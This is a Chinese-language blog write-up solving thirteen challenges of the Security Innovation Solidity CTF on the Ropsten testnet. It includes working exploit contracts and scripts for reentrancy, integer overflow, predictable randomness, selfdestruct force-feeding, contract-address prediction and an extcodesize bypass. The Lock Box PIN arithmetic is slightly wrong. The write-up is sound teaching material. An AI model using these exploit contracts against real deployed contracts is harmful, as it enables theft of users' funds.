---
layout:     post
title:      "Solidity CTF WriteUp"
autor:      "dusmart"
tags:
    - write-up
---

> solidity 是以太坊区块链的智能合约编写语言，[solidity CTF](https://blockchain-ctf.securityinnovation.com/)是一款针对 solidity 的竞技游戏。其中包含了一些知名的漏洞攻击，如溢出攻击和重入攻击。


<!--more-->

# prepare

1. 使用 chrome 浏览器，安装 metamask 钱包插件，并熟悉钱包的使用，创建一个本地账户。
2. 在 [ropsten faucet](https://faucet.dimensions.network/) 领取测试网的测试币，如果领不到可以试试其他的 faucet。
3. 回到 solidity ctf 游戏主页，通过一笔免费交易注册账号，填上自己的参赛名。
4. 在 Dashboard 页面浏览游戏题目，选择一个付费开始，然后想办法将游戏合约中的测试币再收回来。

![img](/assets/img/2021-06-28/signup.png)

# 竞赛题目形式和框架

在 Ropsten 测试网上完成竞赛，如下代码所示，每一个题目都通过这个框架限制参与者只能为我们自己或者创建该轮游戏的模板合约，另外，我们也可以通过框架的一个方法来为其他地址添加操作授权。

每一轮游戏都将继承自这个合约，在我们转测试币给模板合约的时候，会通过模板合约创建出该轮游戏合约，其中游戏的关键函数基本上都会应用 `ctf` 这个修饰器，修饰器中保证了只有 `authorizedToPlay` 中的地址才有资格参赛，用于防止其他人来玩我们花游戏币创建出的游戏。

```solidity
pragma solidity 0.4.24;

contract CtfFramework{
    mapping(address => bool) internal authorizedToPlay;
    constructor(address _ctfLauncher, address _player) public {
        authorizedToPlay[_ctfLauncher] = true;
        authorizedToPlay[_player] = true;
    }
    modifier ctf() { 
        require(authorizedToPlay[msg.sender], "Your wallet or contract is not authorized to play this challenge. You must first add this address via the ctf_challenge_add_authorized_sender(...) function.");
        emit Transaction(msg.sender);
        _;
    }
    function ctf_challenge_add_authorized_sender(address _addr) external ctf{
        authorizedToPlay[_addr] = true;
    }
}
```

# Game 1: Donate

该游戏考查使用合约的基本能力，即不借助作者提供的按钮来完成合约函数调用。

进入游戏后可以通过 Source 看到游戏源码，除了构造函数外提供了两个函数，一个是默认的函数用于接收捐赠，另一个是收回其中捐赠的函数 `withdrawDonationsFromTheSuckersWhoFellForIt`。 直接调用该函数即可。

另外，DApp 页面也提供了一些按钮，用于捐赠，其实这是游戏作者帮我们包装好的接收捐赠的接口，我们如果点击并通过钱包发起交易，则会将测试币捐入合约，不过不用担心，最后我们都可以有办法收回来。

如果喜欢在本地开发，可以使用 hardhat 框架和 ethers.js 库。需要提前在配置文件中将自己钱包私钥导入，导入完成后参考代码如下：

```nodejs
const { ethers } = require("hardhat");
const hre = require("hardhat");
let abi = [{"constant":false,"inputs":[{"name":"_addr","type":"address"}],"name":"ctf_challenge_add_authorized_sender","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"funds","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_ctfLauncher","type":"address"},{"name":"_player","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"player","type":"address"}],"name":"Transaction","type":"event"},{"constant":false,"inputs":[],"name":"withdrawDonationsFromTheSuckersWhoFellForIt","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
let addr = '0xf1d46beb970964056254b713fcf7d0e93607c9bb' // 游戏合约的地址
async function main() {
  let my_addr = '0x3CceFF39114297D6C11Fe233520Fa35C9744E97C'; // 我们注册游戏时的玩家地址
  let me = await hre.ethers.getSigner(my_addr);
  let contract = new ethers.Contract(addr, abi); // 创建该合约实例
  console.log("result: %s", await contract.connect(me).withdrawDonationsFromTheSuckersWhoFellForIt()) // 调用 withdraw
}
main()
```

如果不想本地安装开发环境，也可以直接在 remix ide 中进行开发。

![img](/assets/img/2021-06-28/remix.png)

# Game 2: Lock Box

该游戏考查[区块浏览器](https://ropsten.etherscan.io/tx/0x6ad89a938bde6519444c4c594ca408a065704008ec6b4b9fcc40a33ac8a937c5)的使用。

我们在区块浏览器中粘贴我们自己的地址，即可看到最近的交易(函数调用/Transaction)列表，点击最近的一个交易，即可看到该交易发生的时间戳。

查看游戏合约代码可知，我们需要调用 unlock 函数才能收回测试币，unlock 成功的条件是输入正确的 pin 码。 该 pin 码在创建合约时生成，`pin = now%10000;`，我们用10000模交易时间戳（Jul-01-2021 03:40:55 AM +UTC）即可得到正确 pin 码为 `1625110855%10000=08551`。

该游戏在 Dapp 页面为我们提供了按钮，因此不必再在本地调用，直接将四位 pin 码依次输入点击 Unlock 按钮即可。

# Game 3: Piggy Bank

该游戏考查继承时的覆盖和修饰器的使用，CharliesPiggyBank 继承自 PiggyBank 并覆盖了其中的 `collectFunds` 方法。在 PiggyBank 合约中，该方法有 `onlyOwner` 的修饰器，限制了只有游戏创建合约本身才能调用该函数。但是在覆盖之后没有了该修饰器，所以可以参与该游戏的人都能直接调用 `collectFunds`。

Dapp 页面的按钮没有实际调用该方法，因此我们只能自己手动本地/Remix调用了，传入合约内的币的数目即可，单位为 Wei，因此总量为 150000000000000000。

在这里如果使用 Remix，且多输入了一个0，会导致调用合约函数失败时，Remix/钱包 会友好提醒我们该笔交易可能会失败从而终止交易，但是如果本地开发就只能失败后才看到效果了。

# Game 4: SI Token Sale

该游戏考查**溢出攻击**，在其他合约中我们基本上都能看到 SafeMath 的影子，但该合约中没有使用该 Library。仔细观察下方函数 `purchaseTokens`，如果我们传入的值比 `feeAmount` 要小，那么 `balances[msg.sender]` 将会溢出，我们的 SI Token 将会非常大。到时候随便调用 `refundTokens` 销毁 SI TOKEN，换回 ETH 即可。

```solidity
function purchaseTokens(uint256 _value) internal{
    require(_value > 0, "Cannot Purchase Zero Tokens");
    require(_value < balances[this], "Not Enough Tokens Available");
    balances[msg.sender] += _value - feeAmount;
    balances[this] -= _value;
    balances[developer] += feeAmount; 
    etherCollection += msg.value;
}
function () payable external ctf{
    purchaseTokens(msg.value);
}
```

这里我们直接转账 1 Wei给该合约即可（如果直接使用钱包转账，需要注意Gas Limit调大一些）。如果在钱包中添加该代币，即可看到我们的资产已经非常大。

![img](/assets/img/2021-06-28/sitoken.png)

`refundTokens` 的参数应该是需要取回的 ETH 的两倍，因此这里输入 `(0.3ETH+1Wei)*2=600000000000000002`。

# Game 5: Secure Bank

该游戏考查继承和覆盖，如果使用 Remix 可以清楚的观察到有两个 `deposit` 函数，其中一个是 `MembersBank` 中的函数，接收的参数为 uint256 类型、单位为 Wei 的取款，另一个是 `SecureBank` 中的函数，接收的参数为 uint8 类型、单位为 ether 的取款。猜测考的是作者编写时弄错类型导致继承失败。前者明显校验不足，任何可以参与游戏的人都能提取其他人账户里的代币。

因此我们直接为创建游戏合约的地址`0x2272071889eDCeACABce7dfec0b1E017c6Cad120` 随便 register 一个名字以满足 `MembersBank.withdraw` 的要求，然后公然将该地址的代币提取到我们的账户即可。

![img](/assets/img/2021-06-28/scurebank.png)

# Game 6: Lottery

该游戏教导我们不要尝试取当前区块的哈希，因为当前及以后的区块还没有被挖出来，根本没有哈希可以用。因此代码中 `entropy` 恒等于 0，而 `entropy2` 是我们地址的哈希。

```
function play(uint256 _seed) external payable ctf{
    require(msg.value >= 1 finney, "Insufficient Transaction Value");
    totalPot = totalPot.add(msg.value);
    bytes32 entropy = blockhash(block.number);
    bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
    bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
    bytes32 guess = keccak256(abi.encodePacked(_seed));
    if(guess==target){
        //winner
        uint256 payout = totalPot;
        totalPot = 0;
        msg.sender.transfer(payout);
    }
}    
```

所以只需要找一个网站算一下我们自己地址的哈希即可。通过网站[Keccak-256 在线计算](https://emn178.github.io/online-tools/keccak_256.html)输入我们的地址并启用 Hex 模式即可得到结果。

![img](/assets/img/2021-06-28/keccak256.png)

将该值作为接口 `play` 的输入，并打入 1 finny 的测试币即可完成收割。


# Game 7: Trust Fund

本游戏创建了一个合约，原意要求我们每年只能提走 0.1 ethers，十年提完。但他通过危险的`call`展示了一个**重入攻击**的例子。The DAO 作为前车之鉴，必须在这里留下名字！

我们构造一个如下Solver合约，将该合约部署至测试网，然后记录下地址`0x3E43A90Ac1C4830D6491Ba1EcB87ce06E3fBD077`，再通过游戏合约的`ctf_challenge_add_authorized_sender` 接口添加授权给该合约。再调用该Solver的`play`接口（注意提高 gas limit 防止汽油费不够导致失败），即可将全部资产一次性提走到该合约中。再手动调用 Solver 的 `withdraw` 即可将全部测试币提回我们的口袋。


```
pragma solidity 0.4.24;

contract TrustFundSolver {
    address public owner;
    address public target;
    constructor(address t) public {
        owner = msg.sender;
        target = t;
    }
    function() external payable {
        uint256 remain = msg.sender.balance;
        if (remain == 0) {
            return;
        }
        I(target).withdraw();
    }
    function play() external {
        I(target).withdraw();
    }
    function withdraw() external {
        owner.transfer(this.balance);
    }
}

interface I {
     function withdraw() external;
}

```

可以清楚地在我们solver的[play交易](https://ropsten.etherscan.io/tx/0x8d6c72bf58fb48ec7ed6637fb1e0466c1024f0add0100949b247c26ba80cf252)中看到整个过程，确实除了第一次调用外，重入了游戏合约9次，从而将所有测试币一次性提走。

![img](/assets/img/2021-06-28/reenter.png)

# Game 8: Heads or Tails

本游戏主体是猜正反，猜测打包我们交易的区块的前一个区块的最后一位是 0 还是 1，猜错了赌注全部交给游戏合约，猜对了拿走自己赌注的一半的奖励。该游戏考查简单的智能合约创建。

```
function play(bool _heads) external payable ctf{
    require(msg.value == cost, "Incorrect Transaction Value");
    require(gameFunds >= cost.div(2), "Insufficient Funds in Game Contract");
    bytes32 entropy = blockhash(block.number-1);
    bytes1 coinFlip = entropy[0] & 1;
    if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
        //win
        gameFunds = gameFunds.sub(msg.value.div(2));
        msg.sender.transfer(msg.value.mul(3).div(2));
    }
    else {
        //loser
        gameFunds = gameFunds.add(msg.value);
    }
}
```

我们创建一个如下Solver合约即可，因为我们调用我们Solver合约的交易和我们合约调用游戏合约的交易是被打包再一起的，所以他们肯定能读到相同的前一个区块。因此我们通过游戏合约授权我们的Solver之后，即可每次用 0.1 ethers 玩，总共玩 20 次，从而拿回游戏合约中的 1 ethers。

```
contract HeadsOrTailsSolver {
    using SafeMath for uint256;
    address public owner;
    address public target;
    constructor(address t) public payable {
        owner = msg.sender;
        target = t;
    }
    function withdraw() external {
        owner.transfer(this.balance);
    }
    function() public payable{}
    
    function solve() external payable {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if (coinFlip == 1) {
            for (int i = 0; i < 20; i++) {
                I2(target).play.value(1e17)(true);
            }
        } else {
            for (int j = 0; j < 20; j++) {
                I2(target).play.value(1e17)(false);
            }
        }
    }
}

interface I2 {
    function play(bool _heads) external payable;
}
```

# Game 9: Record Label

本游戏考查我们阅读代码的能力，代码相较其他几个游戏都比较长。仔细阅读可以发现我们可以 claim 游戏中的钱，但每笔钱都会根据 `receiverToPercentOfProfit` 中的百分比分配给其中的地址一部分分红。 同时我们可以选择降低我们的收益，继续添加受益者及其分红。

仔细考虑后发现我们可以覆盖已有受益者的权益比例！那么通过游戏合约查阅一下当前的受益人为`0x67C9D573D2c6A0d21334aa8C354c6E162B743E87`，然后将其收益比例降低为0。最后我们提取所有收益即可全部拿到自己手中。

![img](/assets/img/2021-06-28/recordlabel.png)

# Game 10: Slot Machine

该游戏描述了合约在接受正常转账时，只接受每次 1 szabo 的转账金额，但是会在合约内部的金额满 5 个 ethers 时将合约里的所有金额转给最后一次的玩家。如果要一次一次转账我们会转到焦头烂额，因为 `1 ethers / 1 szabo == 1000000`。该游戏实际上考查的是合约毁坏后自动转账的功能。

我们随便部署一个带自毁功能的合约 SlotMachineSolver，并向里面转账 3.499999 个以太的测试币，然后自毁并将钱打给该游戏（真实的以太主网上不要部署这个合约，一定要限制合约只能由你的地址调用，否则会被别人利用的）。然后再手动向游戏合约转入一个 szabo 即可获取所有资产。

```
contract SlotMachineSolver {
    constructor() public payable {
    }

    function attack(address t) public {
        selfdestruct(t);
    }
}
```

# Game 11: Rainy Day Fund

该游戏正常情况下一定需要重新做一次！浪费 2.5 个 ethers 在所难免。如果你看完题解再开始游戏即可避免此次浪费。

该游戏描述了 RainyDayFund 在部署时会自动部署一个名为 DebugAuthorizer 的合约，如果该合约在部署时发现地址中有 1.337 个 ethers，那么便会进入 debug 模式，从而为所欲为。

我们知道合约创建的地址是有固定公式的，目前有两种创建合约的方式，分别是 create 和 create2，两种方式的地址都是可以预测的。该游戏使用的第一种方式创建合约，其合约地址由创建者的地址以及创建者发起过的交易数加一(即`nonce`)共同决定。

因此通过如下代码我们便可以预测出如果我们还没开始游戏，且我们一定是下一个开始游戏的玩家的时候，我们的游戏的 DebugAuthorizer 的地址。我们提前向这个地址打钱 1.337 个 ethers，即可使得我们开始游戏后自动进入 debug 模式。（真实以太主网环境中不要这样做，我们必须通过合约来保证我们预测好地址、打完钱，下一个开始游戏的就是我们自己，而不会被人插队。（这个合约就交给你们了）

以下代码中的 nonce 也可以通过调用以太坊的接口来获取，不用自己去数数，为了简单起见我们这里直接手动数了一下。

```
const rlp = require('rlp');
const keccak = require('keccak');

var nonce = 0x166; //我是第0x166个开始这个游戏的人。
var sender = '0xed0d5160c642492b3b482e006f67679f5b6223a2'; // 创建游戏的合约地址。

var input_arr = [ sender, nonce ];
var rlp_encoded = rlp.encode(input_arr);
var contract_address_long = keccak('keccak256').update(rlp_encoded).digest('hex');
var contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
console.log("RainyDayFund 的地址: " + contract_address);

nonce = 0x1;
sender = '0x'+contract_address;
input_arr = [ sender, nonce ];
rlp_encoded = rlp.encode(input_arr);
contract_address_long = keccak('keccak256').update(rlp_encoded).digest('hex');
contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
console.log("DebugAuthorizer 的地址: " + contract_address);
```

# Game 12: Raffle

该游戏考查了对 this.Xxxx 调用的理解。该游戏主要有 buyTicket、closeRaffle、collectReward 这三个接口，第一个是通过转账特定数值买一个计算好的 ticket，并将下一个区块记录下来作为开奖区块。closeRaffle 则是结束比赛，并将开奖区块的哈希取出来，将最后四位作为开奖码。collectReward 则是根据开奖码决定是否发钱。

但通过查看 blockhash 的[文档](https://docs.soliditylang.org/en/v0.4.24/units-and-global-variables.html)发现，合约是无法取出 256 个区块之前的区块哈希的，值一定为 0。因此我们转账 0.1 ethers 买一个值为 0000 的 ticket，等到 256 个区块之后再开奖，开奖码一定为 0000。`(100 * 16s / 60 s/min) = 68.27 min` 68分钟后再开奖即可（测试网可能会稍快一些）。

当直接调用时发现任何人调用 closeRaffle 之后都会失去 collectReward的资格，但我们查看fallback函数发现该函数在调用内部接口时使用了 `this.`，这会导致本次调用过程中的msg.sender变更为合约自己。因此我们在  closeRaffle 时只需要给合约本身添加授权，同时转账 0 即可。

```
function () public payable ctf{
    if(msg.value>=fee){
        this.buyTicket();
    }
    else if(msg.value == 0){
        this.closeRaffle();
    }
    else{
        this.collectReward();
    }
}
```


# Game 13: Scratchcard

该游戏是想通过 play 来猜当前区块的打包时间戳的后八位，如果猜对了则返还赌注，并给我们累计一次胜利次数，如果猜错了则直接清空胜利次数。当连续胜利次数到达25次之后即可提现，至少提走自己花费的钱的二倍。

我们知道目前以太坊大概16秒出一个块，但我们无法保证一定是相差16秒，且我们的交易不一定在发出后立刻被打包到当前区块（gas费高只能提高概率）。同时该游戏为了避免我们使用合约直接读取当前区块的时间戳，使用了如下的一个装饰器来避免来自合约的调用。

```
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}
modifier notContract(){
    require(!msg.sender.isContract(), "Contracts Not Allowed");
    _;
}
```

但是，查看官网文档可知，当一个合约在创建部署的过程中他的 extcodesize 依旧是 0。因此我们完全可以在部署中直接进行 25 次游戏。参考代码如下。

```
contract ScratchcardSolver {
    address public owner;
    address public target;

    constructor(address t) public payable {
        require(msg.value >= 10 * 10**18, "not enough to play 25 times");
        owner = msg.sender;
        target = t;
        uint256 val = (now % 10**8) * 10**10;
        for (int256 i = 0; i < 25; i++) {
            I3(target).play.value(val)();
        }
        I3(target).collectMegaJackpot(address(target).balance);
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }
}

interface I3 {
    function play() external payable;
    function collectMegaJackpot(uint256 _amount) external;
}

```

但是我们依旧有一个问题需要解决，就是给我们的合约添加授权，之前都是在创建后拿到地址，然后去添加授权。本次只能通过预测拿到地址，然后提前授权（注意授权操作也会使nonce变大），最后部署该Solver。

